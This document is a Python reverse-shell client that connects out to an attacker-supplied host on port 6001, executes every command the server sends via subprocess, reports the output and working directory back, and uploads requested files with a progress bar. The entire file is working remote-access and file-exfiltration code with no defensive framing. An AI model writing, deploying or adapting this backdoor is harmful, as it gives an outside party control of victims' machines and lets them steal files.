import socket
import os
import subprocess
import sys
import tqdm

SERVER_HOST = sys.argv[1]
SERVER_PORT = 6001
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
FILE_BUFFER_SIZE = 4096 # send 4096 bytes each time step
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

def sendFile(file, filesize):
    progress = tqdm.tqdm(range(filesize), f"Sending {file}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(file, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    if splited_command[0].lower() == "send":
        #send specified file that is in the current directory
        file = splited_command[1]
        filesize = os.path.getsize(file)

        # send the filename and filesize
        s.send(f"{file}{SEPARATOR}{filesize}".encode())
        sendFile(file, filesize)
       
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
        cwd = os.getcwd()
    # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
# close client connection
s.close()



